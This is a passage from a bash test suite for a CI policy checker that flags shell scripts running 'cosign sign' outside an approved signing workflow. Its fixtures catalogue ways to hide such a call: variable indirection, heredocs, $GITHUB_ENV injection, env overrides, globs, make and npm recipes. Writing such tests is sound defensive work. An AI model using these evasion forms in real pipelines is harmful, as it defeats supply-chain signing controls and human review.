' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: T=S; unset "$T" (an indirect unset) makes S ambiguous' tree "$d"
d=$(mk t_r9select); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
select S in $LIST; do bash "$S"; done
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: select S in $LIST resolves nothing' tree "$d"
d=$(mk t_r9source); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
. bin/conf.sh
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"; printf %s '#!/usr/bin/env bash
S=$NEXT
' > "$d/bin/conf.sh"
expect caught 'AC1 round 9: `. bin/conf.sh` (which reassigns S) resolves nothing in the caller' tree "$d"
d=$(mk t_r9nr2); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
T=$NEXT
declare -n S=T
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: T=$NEXT; declare -n S=T; bash "$S" resolves nothing' tree "$d"
d=$(mk t_r9hs); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
bash bin/clean.sh <<< word
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: a here-string does not open a heredoc: the script after it is still scanned' tree "$d"
d=$(mk t_r9arith); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
n=$((1 << 3))
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: n=$((1 << 3)) does not open a heredoc: the script after it is still scanned' tree "$d"
d=$(mk t_r9arith2); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
(( n = 1 << 2 ))
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: (( n = 1 << 2 )) does not open a heredoc: the script after it is still scanned' tree "$d"
d=$(mk t_r9heresh); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
bash <<EOF
bash bin/other.sh
EOF
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: a heredoc INTO a shell is code: its body is scanned and S resolves nothing' tree "$d"
d=$(mk t_r9after); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=bin/clean.sh
bash "$S"
S=bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: a write after the use makes S ambiguous' tree "$d"
d=$(mk t_r9nonpath); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
S=evil
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: a resolved value that is not path-shaped (S=evil; bash "$S") is an error, not a skip' tree "$d"
d=$(mk t_r9dig); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
cat <<3
bash bin/other.sh
3
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: a `<<` with a digit delimiter cannot be classified: an error, never a guess' tree "$d"
d=$(mk t_r9yenv); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: S=bin/clean.sh; bash "$S"
      - env:
          S: bin/other.sh
        run: bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: an env: key naming S in a later step makes S ambiguous (a variable never crosses steps)' tree "$d"
d=$(mk t_r9yghenv); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: echo "S=$NEXT" >> "$GITHUB_ENV"
      - run: S=bin/clean.sh; bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: echo "S=$NEXT" >> $GITHUB_ENV in another step makes S ambiguous' tree "$d"
d=$(mk t_r9ycross); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: S=bin/clean.sh
      - run: bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: S assigned in one step and read in the next is unresolved (never across steps)' tree "$d"
d=$(mk t_r9yjob); mkdir -p "$d/bin"; printf %s 'jobs:
  a:
    steps:
      - run: S=bin/clean.sh
  b:
    steps:
      - run: bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"
expect caught 'AC1 round 9: S assigned in one job and read in another is unresolved (never across jobs)' tree "$d"
d=$(mk t_r9okyaml); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: |
          S=bin/clean.sh
          bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect caught 'AC1 round 10: S=literal; bash "$S" inside one run block is NOT followed either: a variable script reference is an error' tree "$d"
d=$(mk t_r9okhs); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
bash bin/clean.sh <<< word
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect ok 'AC1 round 9: a here-string followed by a clean script is fine' tree "$d"
d=$(mk t_r9okar); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
n=$((1 << 3))
bash bin/clean.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect ok 'AC1 round 9: an arithmetic shift followed by a clean script is fine' tree "$d"
d=$(mk t_r9okhd); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
cat > x.txt <<EOF
data lines only
EOF
bash bin/clean.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect ok 'AC1 round 9: a real heredoc of data (cat > x <<EOF) followed by a clean script is fine' tree "$d"
# round 10: no resolver, no heredoc stripping (rounds 4-9 each found another plain form; static shell resolution is unbounded)
d=$(mk r10q1); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo "a << b"
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect caught 'round 10: a quoted `<<` (echo "a << b") hides nothing: the script after it is found and its signer seen' tree "$d"
d=$(mk r10q2); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo '\''x<<y'\''
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect caught 'round 10: a quoted `<<` (echo '\''x<<y'\'') hides nothing: the script after it is found and its signer seen' tree "$d"
d=$(mk r10q3); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo "see <<EOF docs"
bash bin/other.sh
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect caught 'round 10: a quoted `<<` (echo "see <<EOF docs") hides nothing: the script after it is found and its signer seen' tree "$d"
d=$(mk r10q4); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: |
          echo "usage: a << b"
          bash bin/other.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/other.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"
expect caught 'round 10: a quoted `<<` inside a run block (echo "usage: a << b") hides nothing: the script after it is found and its signer seen' tree "$d"
d=$(mk r10c1); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    env:
      S: bin/evil
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
[ -n "$S" ] || S=bin/clean.sh
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/evil"
expect caught 'round 10: a conditional default ([ -n "$S" ] || S=bin/clean.sh; bash "$S") with an inherited S from the job env: is a variable script reference: an error, never the literal' tree "$d"
d=$(mk r10c2); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    env:
      S: bin/evil
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
test -z "$S" && S=bin/clean.sh
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/evil"
expect caught 'round 10: a conditional default (test -z "$S" && S=bin/clean.sh; bash "$S") with an inherited S from the job env: is a variable script reference: an error, never the literal' tree "$d"
d=$(mk r10c3); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    env:
      S: bin/evil
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
if [ -z "$S" ]; then S=bin/clean.sh; fi
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/evil"
expect caught 'round 10: a conditional default (if [ -z "$S" ]; then S=bin/clean.sh; fi; bash "$S") with an inherited S from the job env: is a variable script reference: an error, never the literal' tree "$d"
d=$(mk r10c4); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    env:
      S: bin/evil
    steps:
      - run: bash bin/a.sh
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
case "$1" in
  a) S=bin/clean.sh;;
esac
bash "$S"
' > "$d/bin/a.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/evil"
expect caught 'round 10: a conditional default (case "$1" in a) S=bin/clean.sh;; esac; bash "$S") with an inherited S from the job env: is a variable script reference: an error, never the literal' tree "$d"
d=$(mk r10c5); mkdir -p "$d/bin"; printf %s 'jobs:
  b:
    steps:
      - run: bash bin/setup.sh
      - run: |
          test -z "$S" && S=bin/clean.sh
          bash "$S"
' > "$d/.github/workflows/stage-verify.yml"; printf %s '#!/usr/bin/env bash
echo "S=bin/evil" >> "$GITHUB_ENV"
' > "$d/bin/setup.sh"; printf %s '#!/usr/bin/env bash
echo hi
' > "$d/bin/clean.sh"; printf %s '#!/usr/bin/env bash
cosign sign --yes "$IMG"
' > "$d/bin/evil"
expect caught 'round 10: S inherited from $GITHUB_ENV (bin/setup.sh) and read after `test -z "$S" && S=bin/clean.sh` in the next step is a variable script reference: an error' tree "$d"
# the real repository (RED until stage-sign.yml exists and PRs 2-4 remove the old provenance signers)
expect ok "the real stage-sign.yml passes the Sign judge" sign "$root/.github/workflows/stage-sign.yml"
expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$root/.github/workflows/stage-build.yml"
expect ok "the real tree: only stage-sign.yml is new and only it signs provenance" tree "$root"
expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$root"

# ---- round 11: command-position words (Sonnet/Opus fix-verification probes; fail closed) ----------------------------------------
r11_table() { cat <<'TBL'
cw_var	err	a variable in command position ("$S") after a conditional default with an inherited S (Opus inherited-value repro)	[ -n "$S" ] || S=bin/clean.sh\n"$S"	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
cw_var2	err	a bare $S in command position	S=bin/clean.sh\n$S	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
cw_brace	err	${S} in command position	S=bin/clean.sh\n${S}	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
cw_sudo	err	sudo "$S" in command position	sudo "$S"	
cw_ws	err	$GITHUB_WORKSPACE/$S in command position	$GITHUB_WORKSPACE/$S	
cw_expr	err	a ${{ vars.X }} expression in command position	${{ vars.SIGN_SCRIPT }}	
cw_config	err	a script named by a command substitution result ("$S" from jq) in command position	S=$(jq -r .sign release.json)\n"$S"	
cw_case	err	case ... S=bin/clean.sh;; esac; "$S"	case "$X" in a) S=bin/clean.sh;; esac\n"$S"	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
glob_bash	err	bash bin/s*.sh (a glob in an interpreter argument)	bash bin/s*.sh	bin/s.sh=#!/usr/bin/env bash\ncosign sign x\n
glob_q	err	./bin/s?sh (a glob in command position)	./bin/s?sh	bin/sxsh=#!/usr/bin/env bash\ncosign sign x\n
glob_find	err	find bin -name 's*.sh' -exec sh {} +	find bin -name 's*.sh' -exec sh {} +	bin/s.sh=#!/usr/bin/env bash\ncosign sign x\n
ext_bare	found	an extensionless shebang script called as bin/release-sign (no ./)	bin/release-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_ws	found	an extensionless shebang script called through $GITHUB_WORKSPACE	"$GITHUB_WORKSPACE/bin/release-sign"	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_dot	found	an extensionless shebang script called as ./bin/release-sign	./bin/release-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_env	found	env FOO=1 bin/release-sign	env FOO=1 bin/release-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_exec	found	exec bin/release-sign	exec bin/release-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_timeout	found	timeout 60 bin/release-sign	timeout 60 bin/release-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_bashc	found	bash -c 'bin/release-sign'	bash -c 'bin/release-sign'	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_path	found	a bare command that names a script in the tree (reached through PATH): release-sign	echo "$GITHUB_WORKSPACE/bin" >> "$GITHUB_PATH"\nrelease-sign	bin/release-sign=#!/usr/bin/env bash\ncosign sign x\n
ext_missing	err	a path in command position that is not a file in the tree (bin/gone)	bin/gone	
make_recipe	err	make sign (the Makefile recipe is not followed)	make sign	Makefile=sign:\n\tbash bin/s.sh\n;bin/s.sh=#!/usr/bin/env bash\ncosign sign x\n
make_f	err	make -f build/release.mk	make -f build/release.mk	build/release.mk=sign:\n\tbash bin/s.sh\n
find_exec	err	find DIR -name '*.sh' -exec bash {} \;	find bin -name '*.sh' -exec bash {} \;	bin/s.sh=#!/usr/bin/env bash\ncosign sign x\n
xargs_f	err	cat list.txt | xargs -n1 bash	cat list.txt | xargs -n1 bash	list.txt=bin/s.sh\n
run_parts	err	run-parts bin/release.d	run-parts bin/release.d	
npm_run	err	npm run sign	npm run sign	package.json={"scripts":{"sign":"bash bin/s.sh"}}\n
cat_bash	err	cat bin/x | bash (a pipe into a shell)	cat bin/x | bash	bin/x=#!/usr/bin/env bash\ncosign sign x\n
pipe_script	ok	`... | bash bin/clean.sh` (the pipe is data, the script is a file)	echo x | bash bin/clean.sh	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
lit_ok	ok	a literal path to a clean script is fine (bash -eu, sudo, env, timeout, cd bin && ./clean.sh)	bash -eu bin/clean.sh\nsudo bin/clean.sh\nenv A=1 bin/clean.sh\ntimeout 5 bin/clean.sh\ncd bin && ./clean.sh	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
arith_ok	ok	arithmetic and a [[ regex ]] with parentheses open no command: $(( 1 << 3 )), [[ $x =~ ^(a|b)$ ]], case a|b) ... esac	n=$(( $x / 2 ))\n[[ "$x" =~ ^(a|b)$ ]] || echo no\ncase "$x" in a|b) echo ab ;; esac\nbash bin/clean.sh	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
subst_ok	ok	a command substitution in a word does not make the next word a command: d=$(mktemp -d)/x.java; echo $(date) $HOME/x	d=$(mktemp -d)/x.java\necho $(date) $HOME/x\nbash bin/clean.sh	bin/clean.sh=#!/usr/bin/env bash\necho hi\n
TBL
}
r11_case() { # r11_case NAME EXP LABEL RUN FILES
  local name=$1 exp=$2 label=$3 run=$4 files=$5 d f path body
  d=$(mk "r11_$name"); mkdir -p "$d/bin"
  { printf 'jobs:\n  b:\n    steps:\n      - run: |\n'; printf '%b' "$run" | sed 's/^/          /'; printf '\n'; } > "$d/.github/workflows/stage-verify.yml"
  if [ -n "$files" ]; then
    local IFS_SAVE=$IFS; IFS=$'\x01'
    for f in $(printf '%s' "$files" | sed 's/~~/\x01/g'); do
      path=${f%%=*}; body=${f#*=}; mkdir -p "$d/$(dirname "$path")"; printf '%b' "$body" > "$d/$path"
    done
    IFS=$IFS_SAVE
  fi
  chmod +x "$d"/bin/* 2>/dev/null || true
  case "$exp" in
    ok)    expect ok "round 11: $label" tree "$d" ;;
    err)   expect_has "round 11: $label: an error, never silence" tree "$d" "fail closed" ;;
    found) expect_has "round 11: $label: the script is found and its signer seen" tree "$d" "calls 'cosign sign'" ;;
  esac
}
while IFS=$'\t' read -r n e l r fl; do r11_case "$n" "$e" "$l" "$r" "$fl"; done < <(r11_table)

d=$(mk r11ci); mkdir -p "$d/bin"; printf 'jobs:
  c:
    steps:
      - run: bash bin/x-test.sh
' > "$d/.github/workflows/ci.yml"; printf '#!/usr/bin/env bash
"$SUT" --version
xargs echo < /dev/null
' > "$d/bin/x-test.sh"; chmod +x "$d/bin/x-test.sh"
expect ok "round 11: a *-test.sh reached ONLY from ci.yml may run a built binary through a variable and xargs (the carve-out)" tree "$d"
d=$(mk r11stage); mkdir -p "$d/bin"; printf 'jobs:
  c:
    steps:
      - run: bash bin/x-test.sh
' > "$d/.github/workflows/stage-verify.yml"; printf '#!/usr/bin/env bash
"$SUT" --version
xargs echo < /dev/null
' > "$d/bin/x-test.sh"; chmod +x "$d/bin/x-test.sh"
expect_has "round 11: the same test script reached from a STAGE file is judged strictly: command-word variable and xargs are errors" tree "$d" "bin/x-test.sh"

EXPECT=215
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
